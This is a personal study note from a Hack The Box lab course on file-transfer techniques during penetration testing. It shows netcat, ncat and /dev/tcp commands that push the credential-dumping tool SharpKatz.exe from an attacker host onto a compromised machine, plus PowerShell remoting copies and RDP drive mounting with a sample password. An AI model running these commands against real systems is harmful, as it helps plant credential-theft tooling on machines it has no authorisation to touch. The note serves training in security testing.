---
Title: HTB\File_Transfers\miscellaneous_methods
tags:
  - os/windows
  - os/linux
  - os/network- cybersec
source: HTB\File_Transfers\miscellaneous_methods
---

# HTB\File_Transfers\miscellaneous_methods

> Źródło: `HTB\File_Transfers\miscellaneous_methods`

Connecting from our machine
Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe

Ovas420@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe

Connecting from the compromised machine

netcat
Ovas420@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe

ncat
Ovas420@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe

If the compromised machine does not have ncat or netcat

netcat
Ovas420@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
ncat
```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```text
on compromised machine:
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe

```powershell
PowerShell
```text
By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer,
we will need administrative access, be a member of the Remote Management Users group,
or have explicit permissions for PowerShell Remoting in the session configuration.
Let's create an example and transfer a file from DC01 to DATABASE01 and vice versa.

We have a session as Administrator in DC01, the user has administrative rights on DATABASE01, and PowerShell Remoting is enabled.
Let's use Test-NetConnection to confirm we can connect to WinRM.

```powershell
PS C:\htb> whoami
```text
htb\administrator

```powershell
PS C:\htb> hostname
```text
DC01

```powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```text
ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True

Create a remote session
```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```text
copy a file from localhost to the DATABASE01 session
```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```text
copy database.txt from DATABASE01 session to our localhost
```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

RDP
mounting a linux flder using rdesktop
Ovas420@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='<desired linux folder>'

mounting a linux folder using xfreerdp
Ovas420@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer

To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.

**Powiązane:** [[Graph-Home]] [[OS-Windows]] [[OS-Linux]] [[OS-Network]]
